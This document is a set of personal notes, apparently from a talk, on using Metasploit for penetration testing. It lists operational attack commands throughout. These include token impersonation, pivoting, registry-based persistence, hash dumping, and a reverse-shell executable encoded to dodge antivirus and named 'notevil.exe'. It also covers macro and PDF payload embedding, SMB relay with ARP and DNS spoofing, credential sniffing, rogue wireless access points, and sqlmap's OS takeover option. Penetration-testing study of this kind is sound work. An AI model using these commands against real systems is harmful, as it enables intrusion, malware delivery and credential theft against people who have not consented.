Metasploit Kung Fu - Notes

XMLRPC Interface - allows metasploit to be accessed via XML over RPC, listens on TCP 55553 by default
msf> load xmlrpc

Payloads - Singles (windows/shell_bind_tcp) vs. Stages (windows/shell/bind_tcp)
Singles don't require back and forth communication, whereas stages allow for more flexibility in payloads 


Exploits - some modules include check to verify vulnerability first and evasion to dodge IDS

set RHOSTS file:/tmp/targets.txt - when you don't have contiguous ip addresses or a single domain

Metasploit has IPv6 support in all exploits and auxiliary modules and some payloads

Save command will keep your session settings in ~/.msf3/config

Exploit -z will put any new sessions in the background, good for multiple targets
Exploit -j will background the exploit itself and give you the msf> prompt back right away
The commands can be used together

Pivot using msf> route add 

Netcat using msf> connect 

Resource files allow you to script metasploit commands msf> resource attack.rc

msf> irb gives you an interactive ruby shell usefull for writing exploits in real time that use ruby libraries

Pivot FTW meterpreter> portfwd add -l 1111 -p 2222 -r 

To elevate to admin or system priveleges meterpreter> use priv

Incognito meterpreter> use incognito, list_tokens -u, impersonate_token DOMAIN\\user
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "domain\\user"
meterpreter> execute -c -H -f cmd -a "/k" -i -t <--- Use the -t to use your impersonated token or meterpreter > list_tokens -g
meterpreter > impersonate_token "DOMAIN\\Domain Admins"
meterpreter> execute -c -H -f cmd -a "/k" -i -t <--- Use the -t to use your impersonated token Meterpreter scripts: meterpreter> run getcountermeasure.rb, winenum.rb, checkvm.rb, prefetchtool.rb, scheduleme.rb, persistence.rb, hashdump.rb, getgui.rb, 

winbf.rb, search_dwld.rb

msf> set AutoRunScript , allows you to quickly migrate to another process after exploitation

Run hidden processes meterpreter> execute -H -f calc.exe

Harvest emails msf> use auxiliary/gather/search_email_collector

DNS recon msf> use auxiliary/gather/dns_enum; ENUM_RVL option will do reverse lookup on a netrange

TCP Portscan msf> use auxiliary/scanner/portscan/
UDP Portscan msf> use auxiliary/scanner/discovery/sweep_udp - only common ports

Database Integration with MySQL and PostgeSQL - hosts, services, vulns, clients, and notes tables
Supports importing(db_import_) of nmap, amap, nessus, qualys, and nexpose data
Manually edit the datbase using db_add_ and db_del_

db_autopwn - generally unreliable and bad for production pentesting. Use -t option to list exploits for a found vulnerability. Planned -s option will only 

return one shell and stop. Planned to run exploits by rating.

Other scanners include ftp, snmp, telnet, smb, robots.txt, oracle, mssql, mysql

New report generator is planned for Metasploit

XMLRPC allows Metasploit to be controlled by third party products like Nsploit(nmap) and BEeF. Both are still somewhat buggy.
msf> load xmlrpc Pass=; default user name is msf; optional ServerType=Web

Nsploit #nmap -A --script=ms03_026_dcom will auto execute the exploit if the port is open and there is an OS match

Public web document metadata is a good passive technique for finding out what software a company may be using

Browser_autopwn uses rex/exploitation/javascripttodetect module to find browser and OS version. Use MATCH option to narrow down the types of 

exploits used. Likely to crash client browser, so quick migration is key. Very buggy behind NAT/Proxy. SSL option uses a default cert, however you can 

provide a signed trusted one. 

If attacking a large number of systems, its good to use separate LHOST c2 server running exploit/multi/handler 

If a target is in another country or running a different language pack, its common for exploitation to fail because the return address may be different. 

Msfpescan can check a binary for a new address by comparing it to the old one.
To find the existing offset # ./msfpescan -r 
To find the new return address # ./msfpescan -b 

msfpayload can output a variety of formats besides EXE including VBA, C, WAR, Ruby, Perl, JS. C code is useful for putting into a repository. VBA is 

useful for embedding in Office docs as a macro. Outputting the payload into Ruby makes them usable by metasploit.

# ./msfpayload windows/shell/reverse_tcp LHOST= , LPORT=4444 R | ./msfencode -c 5 -e x86/shikata_ga_nai -t exe > notevil.exe

x86/shikata_ga_nai is the default and best encoder availabe in msfencode. It uses polymorphic shellcode in both the payload and the stub used to 

decode your data. This is usuallly very good for dodging AV, however some vendors have added detection for the EXE template used by Metasploit. 

The -x option allows you to specify any exe to be used as the PE template. 

To test your encoded binaries and not have the submitted to AV use - http://scanner2.novirusthanks.org/

exe2vba.rb will convert your existing exe into vba format for use in Office Macros
py2exe will convert your python exploit into an exe

Inject payload into a PDF mdf>use windows/fileformat/adobe_pdf_embedded_exe; Requires user interaction

Social Engineering Toolkit(SET) will automate creation of website & email phishing attacks

"Shell is only the beginning" -Dark0perator

HACKING file in framework directory will provide guildines for writting your own exploits. Put in ~/.msf3/modules

Persistence meterpreter>run persistence -r -A -X; Creates a VBS in TEMP and a Run key in registry

"Chunky Bacon" meterpreter> irb will inherit all your ruby methods: client.fs.dir.methods, client.fs.file.methods, client.sys.process.methods, etc
>> client.sys.process.execute("ipconfig", nil, {'Hidden' => true, 'Channelized' => true}); nil is the path to the command

auxiliary/psnuffle will act as a sniffer and also extract credentials for URLs, IMAP, ftp, and pop3

Spoofing attack with SMB Realy
# dnsspoof -f ./OurDNSFile.txt ; # arpspoof -i -t 
msf> use exploit/windows/smb/smb_relay

Enumerating Oracle SID - oracle/xdb_sid, emc_sid, spy_sid, sid_enum
P0wning Oracle - oracle/login_brute, ora_ntlm_stealer, admin/oracle/sql
MSSQL - mssql/mssql/mssql_exec, mssql_login, mssql_sql
MySQL - admin/mysql/mysql_enum, mysql_sql, scanner/mysql/mysql_login, mysql_version

Karmetasploit is fakeap piped into Metasploit. Easier to configure with kmsapng.sh from Dark0perator. Best to modify the script to not run every exploit 

though. # ./kmsapng.sh -m km -i wlan0; km=airbase-ng drivers kma=atherosmad-wifi drivers. -f options adds filtering

Chaka Kahn by J Wright beacons the top SSIDSs from wigle.net. Newer wireless clients will not probe for an AP unless they see a beacon first. Add 

corporate SSIDs to your ssid list and hangout at the closest coffee shop.

Metasploit has DECT functions - dect/call_scanner, dect/station_scanner, requires a DECT card. Buy from German ebay.

Web Assessment
scanner/http/http_version - finds web server versions
scanner/http/robots_txt - pulls info from robots.txt
scanner/http/writable - finds any writable directories
auxiliary/http_index_grabber - performs HTTP Gets on /

Wmap integrates many of these commands msf>load db_wmap
wmap_attack - crawl and attack
wmap_crawl - crawl only, supports authentication and proxy
wmap_targets - manage targets
wmap_sql - only sql statements against internal wmap db
wmap_website - allows you to see structure of target website
wmap_proxy - alternative to ratproxy or burp

SQLMap will leverage an SQL injection to provide a metasploit payload
# ./sqlmap.pay --msf-path=/home/tools/msf3/ --url="http:///inscecure.php" --method=POST --data="name=bob&submit=Search" -p name --os-pwn
Must provide document root, Supports encoding of payload
